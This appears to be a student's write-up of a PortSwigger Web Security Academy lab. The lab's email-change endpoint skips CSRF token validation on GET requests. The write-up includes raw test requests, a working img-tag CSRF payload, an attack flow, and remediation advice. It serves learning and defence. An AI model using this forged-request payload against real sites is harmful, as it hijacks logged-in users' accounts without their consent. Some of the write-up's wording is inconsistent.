# LAB 02 - CSRF where token validation depends on request method

## Lab Information

- **Category:** Cross-Site Request Forgery (CSRF)
- **Type:** CSRF Token
- **Difficulty:** PRACTITIONER
- **Status:** ✅ Solved
- **Date:** 2026-9-3

---

![Cross-Site Request Forgery](https://img.shields.io/badge/Cross_Site_Request_Forgery-CSRF-red)

![Solved](https://img.shields.io/badge/Status-Solved-success)

---

# Table of Contents

- Executive Summary
- Lab Information
- Objective
- Vulnerability Overview
- Attack Prerequisites
- Environment & Scope
- Methodology
- Discovery Process
- Technical Analysis
- Payload Analysis
- Exploitation Flow
- Evidence
- Impact
- Root Cause
- Risk Assessment
- Remediation
- Lessons Learned
- References
- Screenshots

---

# Executive Summary

A Cross-Site Request Forgery (CSRF) vulnerability was discovered in this lab because the email change function applies CSRF token protection only to the POST method; when the method is switched to GET, the protection is applied, but the validity of the CSRF token is not verified.

An attacker can host a malicious HTML form on an external server and induce the logged-in victim's browser to send a forged request to the vulnerable system, resulting in the victim's email address being changed.

---

# Objective

The objective of this lab is to demonstrate that an attacker can cause a state-changing request to be submitted from an external origin while the victim is authenticated to the target application.

---

# Vulnerability Overview

A Cross-Site Request Forgery (CSRF) vulnerability occurs when an attacker tricks the browser of a logged in victim into sending a request to another website, causing that site to execute the request using the victim's privileges.
Authentication establishes who the user is, but it does not necessarily prove that the user intentionally initiated a particular request.

---


# Attack Requirements

1- The victim is logged into the target site.
2- The victim's browser automatically includes the authentication credentials required by the target application.
3- The attacker knows or can guess the target URL and the required transaction parameters.
4- The sensitive action can be triggered via various elements, such as a form, an image, an embedded frame, or a link.
5- Ensure that CSRF token protection is correctly implemented for the POST method only.
6- The application does not implement another effective CSRF defense.

---

# Environment & Scope

| Item | Value |
|------|-------|
| Target | PortSwigger Web Security Academy lab |
| Endpoint | `/my-account/change-email` |
| HTTP Method | POST |
| Parameter | `email` |
| Authentication | Session cookie |
| CSRF Protection | CSRF Token |
| Attack Platform | Exploit Server |
| Client | Web Browser |
| Attack Vector | Cross-site HTML form submission |

---

# Methodology

1. Open the vulnerable lab.
2. Enter a valid email address to update it.
3. Inspect the HTTP request and response using Burp Suite.
4. Check the request to see if it contains protection values.
5. Go to the exploit page.
6. Create the img attribute targeting the vulnerable endpoint.
7. Placing an attacker-controlled email address and a default CSRF token within the `src` attribute.
8. Automatically submit the form from the exploit server.
9. Deliver the exploit to the victim.
10. Verify that the victim's email address was changed.

---

# Discovery Process

### Step 1 — Testing the Update email

```email
mohamad@gmail.com
```

The email address is updated via the `email` parameter, and the browser uses session data to identify the user, with CSRF token protection in place.

### Step 2 — Change the method from post to get

```text
GET/my-account/change-email/HTTP/1.1
HOST:XXXXXXXX
Cookie Session: XXXXXXX
email= mohamad@gmail.com & csrf= XXXXXX
```
In the response, we will observe the error message "HTTP/2 Bad Request": "Missing Parameter 'email'"
In other words, the 'email' parameter is required.

### Step 3 — Testing the inclusion of the `email` parameter in the URL without the `csrf` parameter

```text
GET/my-account/change-email?email= mohamad@gmail.com/HTTP/1.1
HOST:XXXXXXXX
Cookie Session: XXXXXXX

```

In the response, we will observe the error message "HTTP/2 Bad Request": "Missing Parameter 'csrf'"
In other words, the 'csrf' parameter is required.

### Step 3 — Testing the inclusion of the `email` parameter in the URL with the `csrf` parameter With a default value

```text
GET/my-account/change-email?email= mohamad@gmail.com & csrf= invalid/HTTP/1.1
HOST:XXXXXXXX
Cookie Session: XXXXXXX

```
In the response, we will observe A "302 Found" response appeared without any error message, indicating that the server requests the CSRF token during a GET request but fails to validate it correctly and therein lies the vulnerability.

---

# Technical Analysis

The vulnerable functionality uses the following endpoint:

```http
POST /my-account/change-email

email= mohamad@gmail.com & csrf= XXXXXX
```
The relevant request parameter is: email=mohamad@gmail.com
The request is authenticated using the victim's session cookie.

The request includes a CSRF token, but it is not properly validated for the GET method.

Therefore, the application accepts the state-changing request based on the authenticated session without verifying that the request was intentionally initiated by the legitimate application.

```http
GET /my-account/change-email?email= mohamad@gmail.com & csrf= invalid HTTP/2
Host: TARGET
Cookie: session=[REDACTED]
Content-Type: application/x-www-form-urlencoded

```

---

# Payload Analysis

## Payload Used

```html
<img src="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email= attacker@gmail.com & csrf= invalid">
```

## Why This Payload Works

```html
<img src="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email= attacker@gmail.com & csrf= invalid">

```
The `img` element accepts a `src` attribute. When the URL of the vulnerable page including the `email` and `csrf` parameters—is placed within this attribute, the browser interprets the URL and attempts to load the page from the `src` source. Consequently, the victim's browser sends a GET request that modifies the email address, utilizing the victim's own cookies.

---

# Exploitation Flow

```text
Attacker
   │
   ▼
Exploit Server
   │
   │ malicious HTML
   ▼
Victim Browser
   │
   │ automatic GET
   │ + victim session
   ▼
Target Server
   │
   │ GET + invalid CSRF
   ▼
Email changed
  
```

---

# Impact

Depending on the privileges of the victim and the application's functionality, successful CSRF exploitation may allow an attacker to:

- Change the victim's email address.
- Modify account profile information.
- Perform unauthorized account actions.
- Change security-related settings if they are vulnerable to CSRF.
- Perform administrative actions when the victim has administrative privileges.
- Trigger financial or transactional operations if those endpoints lack CSRF protection.
  
### Lab-Specific Impact

In this lab, the attacker can change the authenticated victim's email address without the victim intentionally submitting the request.

---

# Root Cause

The root cause is the absence of an effective CSRF defense on the state-changing email update endpoint.

The application accepts the request:

```http
GET /my-account/change-email?email= mohamad@gmail.com & csrf= invalid HTTP/2
```
without requiring a CSRF token or another effective mechanism to verify that the request originated from an authorized and intentional interaction with the application.
As a result, an attacker-controlled page can construct and submit a forged request to the vulnerable endpoint.

---

# Risk Assessment

| Item | Value |
|------|-------|
| Severity |  Medium |
| CVSS Score | Not calculated |
| CWE | CWE-352: Cross-Site Request Forgery (CSRF) |
| OWASP Category | Cross-Site Request Forgery (CSRF) |
| Exploitability | Demonstrated in lab |
| Business Impact | Account theft , Financial loss , Data leakage and modification , Privacy violation , Full site control|

---

# Remediation

- **Using Anti-CSRF Tokens**
  - Generate a random, unique, and cryptographically secure token for each user session or request.
  - Include this token in operations that alter data state (such as POST, PUT, and DELETE requests).
  - The server verifies that the token received from the browser matches the stored token before executing the request.

- - **SameSite Cookies**
  - Configure session cookies with an appropriate `SameSite` policy such as `Lax` or `Strict` where compatible with the application's requirements.
  - SameSite should be considered an additional layer of defense rather than the sole CSRF protection mechanism.
    
- **Request for re-authentication for sensitive actions**
  - Requiring the user to enter their current password, a two-factor authentication (2FA/OTP) code, or solve a CAPTCHA before completing critical      actions (such as changing their email address, transferring funds, or deleting their account).

- **Strict adherence to REST standards (Strict HTTP Methods)**
  - Ensure that GET requests are used solely for viewing and reading data, and never alter the system state (changing a password via a GET link is     a security disaster).

- **Validating Custom Request Headers**
  - When using technologies like AJAX or Fetch (in SPA applications), add a custom header (such as `X-Requested-With`).
  - Browsers prevent external sites from automatically sending custom headers due to the CORS policy.
 
  - **Checking Origin and Referer Headers**
  - Verifying the Origin or Referer header on the server side as an additional validation step to ensure that the request actually originated from     your site rather than a malicious one.
    
---

# Lessons Learned

- Cookies are sent automatically and blindly.
- Predictability and ease of exploitation.
- Risks associated with state-changing HTTP requests.
- Simulating the attack via independent interfaces.
- Authentication is not equivalent to intent verification.
- CSRF exploits the victim's authenticated session rather than stealing the session itself.
- A state-changing request should require an appropriate CSRF defense.
- The CSRF protection token must be applied to all methods.
  
---

# References

- OWASP
- PortSwigger Web Security Academy
- MITRE CWE
- CVSS Specification

---

# Screenshots

## Test

![Test](Screen-Shots/test-lab2.png)

...

## Burp Request

![Test](Screen-Shots/burp-request-lab2.png)

...

## Payload

![Test](Screen-Shots/payload-lab2.png)

...


## Successful 

![Success](Screen-Shots/success-lab2.png)

---

# Conclusion

This practical experiment demonstrated the successful exploitation of a Cross-Site Request Forgery (CSRF) vulnerability in a lab environment.

The vulnerable endpoint accepted a request to alter the system state without validating the CSRF token. By hosting an HTML `<img>` element on an external exploit server, the attacker was able to induce the victim's browser to send a forged request to the target application.

The key takeaway is that authentication alone is insufficient to verify user intent. CSRF tokens must be implemented across all methods, appropriate SameSite cookie policies applied, and Origin/Referer headers validated where applicable.
